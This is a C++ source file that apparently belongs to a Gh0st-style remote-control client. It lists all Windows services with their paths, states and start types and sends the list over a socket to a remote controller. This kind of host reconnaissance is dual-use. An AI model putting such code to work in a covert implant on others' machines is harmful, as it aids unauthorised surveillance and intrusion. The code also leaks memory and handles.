// ServerManager.cpp: implementation of the CServerManager class.
//
//////////////////////////////////////////////////////////////////////

#include "..\pch.h"
#include "ServerManager.h"
#include "..\..\..\common\macros.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CServerManager::CServerManager(CClientSocket *pClient) : CManager(pClient)
{
    SendServicesList();
}

CServerManager::~CServerManager()
{

}

LPBYTE CServerManager::getServerList()
{
     LPQUERY_SERVICE_CONFIG ServicesInfo = NULL;
	LPENUM_SERVICE_STATUS lpServices    = NULL; 
	LPBYTE			lpBuffer = NULL;
	DWORD    nSize = 0; 
	DWORD    n; 
	DWORD    nResumeHandle = 0; 
	DWORD	 dwServiceType = SERVICE_WIN32; 
	DWORD	 dwLength = 0;
	DWORD	 dwOffset = 0;
	char	 runway[256] = {0};
	char	 autorun[256] = {0};
	BOOL	 isAalid = TRUE;

	SC_HANDLE schSCManager = NULL; 
	BOOL     Flag = FALSE; 

	if((schSCManager=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS))==NULL)
			{
				OutputDebugString("OpenSCManager Error\n");
			}
	lpServices = (LPENUM_SERVICE_STATUS) LocalAlloc(LPTR, 64*1024);        // Allocate Ram 

	EnumServicesStatus(schSCManager,
					   dwServiceType, 
					   SERVICE_STATE_ALL,
					   (LPENUM_SERVICE_STATUS)lpServices, 
						64 * 1024, 
						&nSize, 
						&n, 
						&nResumeHandle);

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, MAX_PATH);
	
	lpBuffer[0] = TOKEN_SERVERLIST;
	dwOffset = 1;

	for (unsigned long i = 0; i < n; i++)  // Display The Services,显示所有的服务
	{ 
		SC_HANDLE service = NULL;
		DWORD     nResumeHandle = 0; 

		service=OpenService(schSCManager,lpServices[i].lpServiceName,SERVICE_ALL_ACCESS);//打开当前指定服务的句柄
		
		if (service == NULL)
			isAalid = false;
		else
			isAalid = true;


		ServicesInfo = (LPQUERY_SERVICE_CONFIG) LocalAlloc(LPTR, 4*1024);        // Allocate Ram 

		QueryServiceConfig(service,ServicesInfo,4*1024,&nResumeHandle); //查询服务的启动类别

		if ( lpServices[i].ServiceStatus.dwCurrentState!=SERVICE_STOPPED) //启动状态
		{
			ZeroMemory(runway, sizeof(runway));
			lstrcat(runway,"启动");
		}
		else
		{
			ZeroMemory(runway, sizeof(runway));
			lstrcat(runway,"停止");
		}

		if(2==ServicesInfo->dwStartType) //启动类别
		{
			ZeroMemory(autorun, sizeof(autorun));
			lstrcat(autorun,"自动");
		}
		if(3==ServicesInfo->dwStartType)
		{
			ZeroMemory(autorun, sizeof(autorun));
			lstrcat(autorun,"手动");
		}
		if(4==ServicesInfo->dwStartType)
		{
			ZeroMemory(autorun, sizeof(autorun));
			lstrcat(autorun,"禁用");
		}
		if (isAalid)
		{
			dwLength = sizeof(DWORD) + lstrlen(lpServices[i].lpDisplayName)
				+ lstrlen(ServicesInfo->lpBinaryPathName) + lstrlen(lpServices[i].lpServiceName)
				+ lstrlen(runway) + lstrlen(autorun) + 2;
		}
		else
		{
			dwLength = sizeof(DWORD) + lstrlen(lpServices[i].lpDisplayName)
				+ lstrlen(lpServices[i].lpServiceName)
				+ lstrlen(runway) + lstrlen(autorun) + lstrlen("No Access") + 2;
		}
		
		// 缓冲区太小，再重新分配下
		if (LocalSize(lpBuffer) < (dwOffset + dwLength))
			lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);

		memcpy(lpBuffer + dwOffset, lpServices[i].lpDisplayName, lstrlen(lpServices[i].lpDisplayName) + 1);
		dwOffset += lstrlen(lpServices[i].lpDisplayName) + 1;//真实名称
		
		memcpy(lpBuffer + dwOffset, lpServices[i].lpServiceName, lstrlen(lpServices[i].lpServiceName) + 1);
		dwOffset += lstrlen(lpServices[i].lpServiceName) + 1;//显示名称
		if (isAalid)
		{
			memcpy(lpBuffer + dwOffset, ServicesInfo->lpBinaryPathName, lstrlen(ServicesInfo->lpBinaryPathName) + 1);
			dwOffset += lstrlen(ServicesInfo->lpBinaryPathName) + 1;//路径

			memcpy(lpBuffer + dwOffset, runway, lstrlen(runway) + 1);//运行状态
			dwOffset += lstrlen(runway) + 1;

			memcpy(lpBuffer + dwOffset, autorun, lstrlen(autorun) + 1);//自启动状态
			dwOffset += lstrlen(autorun) + 1;
		}
		else
		{
			ZeroMemory(runway, sizeof(runway));
			lstrcat(runway, "无权");
			ZeroMemory(autorun, sizeof(autorun));
			lstrcat(autorun, "无权");

			memcpy(lpBuffer + dwOffset, "No Access", lstrlen("No Access") + 1);//路径
			dwOffset += lstrlen("No Access") + 1;

			memcpy(lpBuffer + dwOffset, runway, lstrlen(runway) + 1);//运行状态
			dwOffset += lstrlen(runway) + 1;

			memcpy(lpBuffer + dwOffset, autorun, lstrlen(autorun) + 1);//自启动状态
			dwOffset += lstrlen(autorun) + 1;
		}
	}

	CloseServiceHandle(schSCManager);

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);

	return lpBuffer;						

}

void CServerManager::SendServicesList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getServerList();
	if (lpBuffer == NULL)
		return;	
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}
